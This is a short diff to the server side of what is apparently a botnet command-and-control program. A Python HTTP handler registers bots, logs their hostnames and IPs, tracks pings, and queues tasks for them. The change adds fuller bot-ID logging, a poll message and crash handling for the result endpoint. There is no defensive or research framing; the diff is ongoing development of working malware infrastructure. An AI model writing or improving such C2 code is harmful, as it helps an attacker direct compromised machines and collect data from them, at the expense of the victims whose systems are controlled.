@@ -136,10 +136,13 @@ class C2Handler(BaseHTTPRequestHandler):
             info["ip"] = ip
             self.store.register_bot(bot_id, key_hex, info)
             self.store.log_event(bot_id, "checkin", {"ip": ip})
-            print(f"  {OK}▓{RESET} checkin {BONE}{bot_id[:12]}{RESET} "
+            print(f"  {OK}▓{RESET} checkin {BONE}{bot_id}{RESET} "
                   f"{ASH}{info.get('hostname','?')}@{ip}{RESET}")
         else:
+            # any non-checkin message (ping, result, etc.) counts as activity
             self.store.touch_bot(bot_id, ip)
+            if msg.type == 0x04:  # MT_PING
+                print(f"  {ARTERY}▓{RESET} poll    {BONE}{bot_id}{RESET}")
 
         tasks = self.store.pull_tasks(bot_id, limit=10)
         reply_payload = {"tasks": [
@@ -152,6 +155,14 @@ class C2Handler(BaseHTTPRequestHandler):
         self._respond(200, reply_pkt.hex().encode("ascii"), "text/plain")
 
     def _handle_result(self):
+        try:
+            self._handle_result_inner()
+        except Exception as e:
+            import traceback
+            print_err(f"result handler crashed: {e}")
+            traceback.print_exc()
+
+    def _handle_result_inner(self):
         try:
             body = self._read_body().decode("ascii", errors="replace").strip()
             parts = body.split("\n")
